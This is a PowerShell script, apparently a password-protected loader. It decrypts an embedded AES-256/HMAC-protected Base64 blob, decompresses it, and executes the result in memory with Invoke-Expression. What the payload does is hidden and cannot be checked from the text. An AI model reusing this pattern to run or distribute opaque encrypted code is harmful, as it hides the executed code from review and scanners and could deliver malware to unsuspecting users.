# password-protected loader (AES-256/CBC + HMAC-SHA256), interactive only
$ITER = 150000
$B64  = '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'

function Read-Password-Blank {
  # blank, no-echo password input
  $s = New-Object System.Security.SecureString
  while ($true) {
    $k = [Console]::ReadKey($true)
    if ($k.Key -eq 'Enter') { break }
    if ($k.Key -eq 'Backspace') { if ($s.Length -gt 0) { $s.RemoveAt($s.Length-1) }; continue }
    $s.AppendChar($k.KeyChar)
  }
  $b = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($s)
  try { [Runtime.InteropServices.Marshal]::PtrToStringUni($b) } finally { [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($b) }
}

function ConstEq([byte[]]$a,[byte[]]$b){
  if($a.Length -ne $b.Length){return $false}
  $x=0; for($i=0;$i -lt $a.Length;$i++){ $x = $x -bxor ($a[$i] -bxor $b[$i]) }; return $x -eq 0
}

try {
  $bytes = [Convert]::FromBase64String($B64)
  $salt = $bytes[0..15]; $iv = $bytes[16..31]
  $ctLen = $bytes.Length - 16 - 16 - 32
  if($ctLen -le 0){ throw 'Corrupt payload' }
  $ct = New-Object byte[] $ctLen
  [Array]::Copy($bytes,32,$ct,0,$ctLen)
  $tag = New-Object byte[] 32
  [Array]::Copy($bytes,32+$ctLen,$tag,0,32)

  # interactive-only: always prompt (blank), no env-var fallback
  $pw = Read-Password-Blank
  if([string]::IsNullOrEmpty($pw)){ throw 'Bad password or tampered payload' }

  $kdf = New-Object Security.Cryptography.Rfc2898DeriveBytes($pw,$salt,$ITER)
  $km  = $kdf.GetBytes(64)
  $aesKey = $km[0..31]; $macKey = $km[32..63]

  $h = New-Object Security.Cryptography.HMACSHA256(,[byte[]]$macKey)
  $buf = New-Object byte[] (16 + 16 + $ct.Length)    # FIXED: 16+16+ctLen
  [Array]::Copy($salt,0,$buf,0,16)
  [Array]::Copy($iv,0,$buf,16,16)
  [Array]::Copy($ct,0,$buf,32,$ct.Length)
  if(-not (ConstEq $tag ($h.ComputeHash($buf)))){ throw 'Bad password or tampered payload' }

  $aes = [Security.Cryptography.Aes]::Create(); $aes.Mode='CBC'; $aes.Padding='PKCS7'; $aes.Key=$aesKey; $aes.IV=$iv
  $dec = $aes.CreateDecryptor()
  $plain = $dec.TransformFinalBlock($ct,0,$ct.Length)

  $ms = New-Object IO.MemoryStream (, [byte[]]$plain)
  $gz = New-Object IO.Compression.GZipStream ($ms,[IO.Compression.CompressionMode]::Decompress)
  $sr = New-Object IO.StreamReader ($gz,[Text.Encoding]::UTF8)
  $code = $sr.ReadToEnd()
  Remove-Variable bytes,salt,iv,ct,tag,km,aesKey,macKey,plain,buf -ErrorAction SilentlyContinue

  iex $code
} catch {
  Write-Error $_
  exit 1
}
